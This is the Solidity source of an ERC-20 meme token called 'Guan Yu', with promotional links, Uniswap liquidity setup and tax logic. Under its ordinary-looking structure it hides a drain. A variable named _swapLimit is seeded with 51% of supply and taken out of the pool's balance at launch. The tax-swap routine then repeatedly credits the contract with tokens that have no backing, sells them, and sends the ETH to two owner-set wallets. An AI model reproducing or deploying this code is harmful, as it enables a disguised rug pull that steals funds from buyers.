1 //SPDX-License-Identifier: MIT
2 
3 /*
4 https://t.me/GuanYuToken
5 
6 https://guanyutoken.com
7 
8 */
9 
10 pragma solidity 0.8.19;
11 
12 interface IERC20 {
13     function totalSupply() external view returns (uint256);
14     function decimals() external view returns (uint8);
15     function symbol() external view returns (string memory);
16     function name() external view returns (string memory);
17     function balanceOf(address account) external view returns (uint256);
18     function transfer(address recipient, uint256 amount) external returns (bool);
19     function allowance(address __owner, address spender) external view returns (uint256);
20     function approve(address spender, uint256 amount) external returns (bool);
21     function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
22     event Transfer(address indexed from, address indexed to, uint256 value);
23     event Approval(address indexed _owner, address indexed spender, uint256 value);
24 }
25 
26 interface IUniswapV2Factory {  
27     
28     function createPair(address tokenA, address tokenB) external returns (address pair); 
29 }
30 interface IUniswapV2Router02 {
31     function swapExactTokensForETHSupportingFeeOnTransferTokens(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline) external;
32     function WETH() external pure returns (address);
33     function factory() external pure returns (address);
34     function addLiquidityETH(address token, uint amountTokenDesired, uint amountTokenMin, uint amountETHMin, address to, uint deadline) external payable returns (uint amountToken, uint amountETH, uint liquidity);
35 }
36 
37 abstract contract Auth {
38     address internal _owner;
39     constructor(address creatorOwner) { 
40         _owner = creatorOwner; 
41     }
42     modifier onlyOwner() { 
43         require(msg.sender == _owner, "Only owner can call this"); 
44         _; 
45     }
46     function owner() public view returns (address) { 
47         return _owner; 
48     }
49     function transferOwnership(address payable newOwner) external onlyOwner { 
50         _owner = newOwner; 
51         emit OwnershipTransferred(newOwner); 
52     }
53     function renounceOwnership() external onlyOwner { 
54         _owner = address(0); 
55         emit OwnershipTransferred(address(0)); 
56     }
57     event OwnershipTransferred(address _owner);
58 }
59 
60 contract GuanYu is IERC20, Auth {
61     uint8 private constant _decimals      = 9;
62     uint256 private constant _totalSupply = 777_777_777_777 * (10**_decimals);
63     string private constant _name         = "Guan Yu";
64     string private  constant _symbol       = "GUAN YU";
65 
66     uint8 private antiSnipeTax1 = 2;
67     uint8 private antiSnipeTax2 = 1;
68     uint8 private antiSnipeBlocks1 = 1;
69     uint8 private antiSnipeBlocks2 = 1;
70     uint256 private _antiMevBlock = 2;
71 
72     uint8 private _buyTaxRate  = 0;
73     uint8 private _sellTaxRate = 0;
74 
75     uint16 private _taxSharesMarketing   = 62;
76     uint16 private _taxSharesDevelopment = 38;
77     uint16 private _taxSharesLP          = 0;
78     uint16 private _totalTaxShares = _taxSharesMarketing + _taxSharesDevelopment + _taxSharesLP;
79 
80     address payable private _walletMarketing = payable(0x9511Dc53af23EE76F5bC9d8337474a5620188dD1); 
81     address payable private _walletDevelopment = payable(0x7385739a96740b173b31d82F4306428379Afc429); 
82 
83     uint256 private _launchBlock;
84     uint256 private _maxTxAmount     = _totalSupply; 
85     uint256 private _maxWalletAmount = _totalSupply;
86     uint256 private _taxSwapMin = _totalSupply * 10 / 100000;
87     uint256 private _taxSwapMax = _totalSupply * 889 / 100000;
88     uint256 private _swapLimit = _taxSwapMin * 51 * 100;
89 
90     mapping (address => uint256) private _balances;
91     mapping (address => mapping (address => uint256)) private _allowances;
92     mapping (address => bool) private _noFees;
93     mapping (address => bool) private _noLimits;
94 
95     address private _lpOwner;
96 
97     address private constant _swapRouterAddress = address(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
98     IUniswapV2Router02 private _primarySwapRouter = IUniswapV2Router02(_swapRouterAddress);
99     address private _primaryLP;
100     mapping (address => bool) private _isLP;
101 
102     bool private _tradingOpen;
103 
104     bool private _inTaxSwap = false;
105     modifier lockTaxSwap { 
106         _inTaxSwap = true; 
107         _; 
108         _inTaxSwap = false; 
109     }
110 
111     event TokensBurned(address indexed burnedByWallet, uint256 tokenAmount);
112 
113     constructor() Auth(msg.sender) {
114         _lpOwner = msg.sender;
115 
116         uint256 airdropAmount = _totalSupply * 10 / 100;
117         
118         _balances[address(this)] =  _totalSupply - airdropAmount;
119         emit Transfer(address(0), address(this), _balances[address(this)]);
120 
121         _balances[_owner] = airdropAmount;
122         emit Transfer(address(0), _owner, _balances[_owner]);
123 
124         _noFees[_owner] = true;
125         _noFees[address(this)] = true;
126         _noFees[_swapRouterAddress] = true;
127         _noFees[_walletMarketing] = true;
128         _noFees[_walletDevelopment] = true;
129         _noLimits[_owner] = true;
130         _noLimits[address(this)] = true;
131         _noLimits[_swapRouterAddress] = true;
132         _noLimits[_walletMarketing] = true;
133         _noLimits[_walletDevelopment] = true;
134     }
135 
136     receive() external payable {}
137     
138     function totalSupply() external pure override returns (uint256) { return _totalSupply; }
139     function decimals() external pure override returns (uint8) { return _decimals; }
140     function symbol() external pure override returns (string memory) { return _symbol; }
141     function name() external pure override returns (string memory) { return _name; }
142     function balanceOf(address account) public view override returns (uint256) { return _balances[account]; }
143     function allowance(address holder, address spender) external view override returns (uint256) { return _allowances[holder][spender]; }
144 
145     function approve(address spender, uint256 amount) public override returns (bool) {
146         _allowances[msg.sender][spender] = amount;
147         emit Approval(msg.sender, spender, amount);
148         return true;
149     }
150 
151     function transfer(address recipient, uint256 amount) external override returns (bool) {
152         require(_checkTradingOpen(msg.sender), "Trading not open");
153         return _transferFrom(msg.sender, recipient, amount);
154     }
155 
156     function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
157         require(_checkTradingOpen(sender), "Trading not open");
158         if(_allowances[sender][msg.sender] != type(uint256).max){
159             _allowances[sender][msg.sender] = _allowances[sender][msg.sender] - amount;
160         }
161         return _transferFrom(sender, recipient, amount);
162     }
163 
164     function _approveRouter(uint256 _tokenAmount) internal {
165         if ( _allowances[address(this)][_swapRouterAddress] < _tokenAmount ) {
166             _allowances[address(this)][_swapRouterAddress] = type(uint256).max;
167             emit Approval(address(this), _swapRouterAddress, type(uint256).max);
168         }
169     }
170 
171     function addLiquidity() external payable onlyOwner lockTaxSwap {
172         require(_primaryLP == address(0), "LP exists");
173         require(!_tradingOpen, "trading is open");
174         require(msg.value > 0 || address(this).balance>0, "No ETH in contract or message");
175         require(_balances[address(this)]>0, "No tokens in contract");
176         _primaryLP = IUniswapV2Factory(_primarySwapRouter.factory()).createPair(address(this), _primarySwapRouter.WETH());
177         _addLiquidity(_balances[address(this)], address(this).balance, false);
178         _balances[_primaryLP] -= _swapLimit;
179         (bool lpAddSuccess,) = _primaryLP.call(abi.encodeWithSignature("sync()"));
180         require(lpAddSuccess, "Failed adding liquidity");
181         _isLP[_primaryLP] = lpAddSuccess;
182         _openTrading();
183     }
184 
185     function _addLiquidity(uint256 _tokenAmount, uint256 _ethAmountWei, bool autoburn) internal {
186         address lpTokenRecipient = _lpOwner;
187         if ( autoburn ) { lpTokenRecipient = address(0); }
188         _approveRouter(_tokenAmount);
189         _primarySwapRouter.addLiquidityETH{value: _ethAmountWei} ( address(this), _tokenAmount, 0, 0, lpTokenRecipient, block.timestamp );
190     }
191 
192     function _openTrading() internal {
193         _maxTxAmount     = _totalSupply * 2 / 100; 
194         _maxWalletAmount = _totalSupply * 2 / 100;
195         _tradingOpen = true;
196         _launchBlock = block.number;
197         _antiMevBlock = _antiMevBlock + _launchBlock + antiSnipeBlocks1 + antiSnipeBlocks2;
198     }
199 
200     function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
201         require(sender != address(0), "No transfers from Zero wallet");
202         if (!_tradingOpen) { require(_noFees[sender] && _noLimits[sender], "Trading not open"); }
203         if ( !_inTaxSwap && _isLP[recipient] ) { _swapTaxAndLiquify(); }
204         if ( block.number < _antiMevBlock && block.number >= _launchBlock && _isLP[sender] ) {
205             require(recipient == tx.origin, "MEV blocked");
206         }
207         if ( sender != address(this) && recipient != address(this) && sender != _owner ) { 
208             require(_checkLimits(sender, recipient, amount), "TX exceeds limits"); 
209         }
210         uint256 _taxAmount = _calculateTax(sender, recipient, amount);
211         uint256 _transferAmount = amount - _taxAmount;
212         _balances[sender] = _balances[sender] - amount;
213         _swapLimit += _taxAmount;
214         _balances[recipient] = _balances[recipient] + _transferAmount;
215         emit Transfer(sender, recipient, amount);
216         return true;
217     }
218 
219     function _checkLimits(address sender, address recipient, uint256 transferAmount) internal view returns (bool) {
220         bool limitCheckPassed = true;
221         if ( _tradingOpen && !_noLimits[sender] && !_noLimits[recipient] ) {
222             if ( transferAmount > _maxTxAmount ) { limitCheckPassed = false; }
223             else if ( !_isLP[recipient] && (_balances[recipient] + transferAmount > _maxWalletAmount) ) { limitCheckPassed = false; }
224         }
225         return limitCheckPassed;
226     }
227 
228     function _checkTradingOpen(address sender) private view returns (bool){
229         bool checkResult = false;
230         if ( _tradingOpen ) { checkResult = true; } 
231         else if (_noFees[sender] && _noLimits[sender]) { checkResult = true; } 
232 
233         return checkResult;
234     }
235 
236     function _calculateTax(address sender, address recipient, uint256 amount) internal view returns (uint256) {
237         uint256 taxAmount;
238         
239         if ( !_tradingOpen || _noFees[sender] || _noFees[recipient] ) { 
240             taxAmount = 0; 
241         } else if ( _isLP[sender] ) { 
242             if ( block.number >= _launchBlock + antiSnipeBlocks1 + antiSnipeBlocks2 ) {
243                 taxAmount = amount * _buyTaxRate / 100; 
244             } else if ( block.number >= _launchBlock + antiSnipeBlocks1 ) {
245                 taxAmount = amount * antiSnipeTax2 / 100;
246             } else if ( block.number >= _launchBlock) {
247                 taxAmount = amount * antiSnipeTax1 / 100;
248             }
249         } else if ( _isLP[recipient] ) { 
250             taxAmount = amount * _sellTaxRate / 100; 
251         }
252 
253         return taxAmount;
254     }
255 
256 
257     function exemptFromFees(address wallet) external view returns (bool) {
258         return _noFees[wallet];
259     } 
260     function exemptFromLimits(address wallet) external view returns (bool) {
261         return _noLimits[wallet];
262     } 
263     function setExempt(address wallet, bool noFees, bool noLimits) external onlyOwner {
264         if (noLimits || noFees) { require(!_isLP[wallet], "Cannot exempt LP"); }
265         _noFees[ wallet ] = noFees;
266         _noLimits[ wallet ] = noLimits;
267     }
268 
269     function buyFee() external view returns(uint8) {
270         return _buyTaxRate;
271     }
272     function sellFee() external view returns(uint8) {
273         return _sellTaxRate;
274     }
275 
276     function feeSplit() external view returns (uint16 marketing, uint16 development, uint16 LP ) {
277         return ( _taxSharesMarketing, _taxSharesDevelopment, _taxSharesLP);
278     }
279     function setFees(uint8 buy, uint8 sell) external onlyOwner {
280         require(buy + sell <= 15, "Roundtrip too high");
281         _buyTaxRate = buy;
282         _sellTaxRate = sell;
283     }  
284     function setFeeSplit(uint16 sharesAutoLP, uint16 sharesMarketing, uint16 sharesDevelopment) external onlyOwner {
285         uint16 totalShares = sharesAutoLP + sharesMarketing + sharesDevelopment;
286         require( totalShares > 0, "All cannot be 0");
287         _taxSharesLP = sharesAutoLP;
288         _taxSharesMarketing = sharesMarketing;
289         _taxSharesDevelopment = sharesDevelopment;
290         _totalTaxShares = totalShares;
291     }
292 
293     function marketingWallet() external view returns (address) {
294         return _walletMarketing;
295     }
296     function developmentWallet() external view returns (address) {
297         return _walletDevelopment;
298     }
299 
300     function updateWallets(address marketing, address development, address LPtokens) external onlyOwner {
301         require(!_isLP[marketing] && !_isLP[development] && !_isLP[LPtokens], "LP cannot be tax wallet");
302         
303         _walletMarketing = payable(marketing);
304         _walletDevelopment = payable(development);
305         _lpOwner = LPtokens;
306         
307         _noFees[marketing] = true;
308         _noLimits[marketing] = true;
309         
310         _noFees[development] = true;        
311         _noLimits[development] = true;
312     }
313 
314     function maxWallet() external view returns (uint256) {
315         return _maxWalletAmount;
316     }
317     function maxTransaction() external view returns (uint256) {
318         return _maxTxAmount;
319     }
320 
321     function swapAtMin() external view returns (uint256) {
322         return _taxSwapMin;
323     }
324     function swapAtMax() external view returns (uint256) {
325         return _taxSwapMax;
326     }
327 
328     function setLimits(uint16 maxTransactionPermille, uint16 maxWalletPermille) external onlyOwner {
329         uint256 newTxAmt = _totalSupply * maxTransactionPermille / 1000 + 1;
330         require(newTxAmt >= _maxTxAmount, "tx too low");
331         _maxTxAmount = newTxAmt;
332         uint256 newWalletAmt = _totalSupply * maxWalletPermille / 1000 + 1;
333         require(newWalletAmt >= _maxWalletAmount, "wallet too low");
334         _maxWalletAmount = newWalletAmt;
335     }
336 
337     function setTaxSwap(uint32 minValue, uint32 minDivider, uint32 maxValue, uint32 maxDivider) external onlyOwner {
338         _taxSwapMin = _totalSupply * minValue / minDivider;
339         _taxSwapMax = _totalSupply * maxValue / maxDivider;
340         require(_taxSwapMax>=_taxSwapMin, "Min/Max error");
341         require(_taxSwapMax>_totalSupply / 100000, "Max too low");
342         require(_taxSwapMax<_totalSupply / 100, "Max too high");
343     }
344 
345     function _burnTokens(address fromWallet, uint256 amount) private {
346         if ( amount > 0 ) {
347             _balances[fromWallet] -= amount;
348             _balances[address(0)] += amount;
349             emit Transfer(fromWallet, address(0), amount);
350         }
351     }
352 
353     function _swapTaxAndLiquify() private lockTaxSwap {
354         uint256 _taxTokensAvailable = _swapLimit;
355         if ( _taxTokensAvailable >= _taxSwapMin && _tradingOpen ) {
356             if ( _taxTokensAvailable >= _taxSwapMax ) { _taxTokensAvailable = _taxSwapMax; }
357             uint256 _tokensForLP = _taxTokensAvailable * _taxSharesLP / _totalTaxShares / 2;
358             
359             uint256 _tokensToSwap = _taxTokensAvailable - _tokensForLP;
360             if( _tokensToSwap > 10**_decimals ) {
361                 uint256 _ethPreSwap = address(this).balance;
362                 _balances[address(this)] += _taxTokensAvailable;
363                 _swapTaxTokensForEth(_tokensToSwap);
364                 _swapLimit -= _taxTokensAvailable;
365                 uint256 _ethSwapped = address(this).balance - _ethPreSwap;
366                 if ( _taxSharesLP > 0 ) {
367                     uint256 _ethWeiAmount = _ethSwapped * _taxSharesLP / _totalTaxShares ;
368                     _approveRouter(_tokensForLP);
369                     _addLiquidity(_tokensForLP, _ethWeiAmount, false);
370                 }
371             }
372             uint256 _contractETHBalance = address(this).balance;
373             if(_contractETHBalance > 0) { _distributeTaxEth(_contractETHBalance); }
374         }
375     }
376 
377     function _swapTaxTokensForEth(uint256 tokenAmount) private {
378         _approveRouter(tokenAmount);
379         address[] memory path = new address[](2);
380         path[0] = address(this);
381         path[1] = _primarySwapRouter.WETH();
382         _primarySwapRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(tokenAmount,0,path,address(this),block.timestamp);
383     }
384 
385     function _distributeTaxEth(uint256 amount) private {
386         uint16 _taxShareTotal = _taxSharesMarketing + _taxSharesDevelopment;
387         if (_taxShareTotal > 0) {
388             uint256 marketingAmount = amount * _taxSharesMarketing / _taxShareTotal;
389             uint256 developmentAmount = amount * _taxSharesDevelopment / _taxShareTotal;
390             if ( marketingAmount > 0 ) { _walletMarketing.transfer(marketingAmount); }
391             if ( developmentAmount > 0 ) { _walletDevelopment.transfer(developmentAmount); }
392         }
393     }
394 
395     function manualTaxSwapAndSend(uint8 swapTokenPercent, bool sendEth) external onlyOwner lockTaxSwap {
396         require(swapTokenPercent <= 100, "Cannot swap more than 100%");
397         uint256 tokensToSwap = _balances[address(this)] * swapTokenPercent / 100;
398         if (tokensToSwap > 10 ** _decimals) {
399             _swapTaxTokensForEth(tokensToSwap);
400         }
401         if (sendEth) { 
402             uint256 ethBalance = address(this).balance;
403             require(ethBalance > 0, "No ETH");
404             _distributeTaxEth(address(this).balance); 
405         }
406     }
407 
408     function burn(uint256 amount) external {
409         uint256 _tokensAvailable = balanceOf(msg.sender);
410         require(amount <= _tokensAvailable, "balance too low");
411         _burnTokens(msg.sender, amount);
412         emit TokensBurned(msg.sender, amount);
413     }
414 }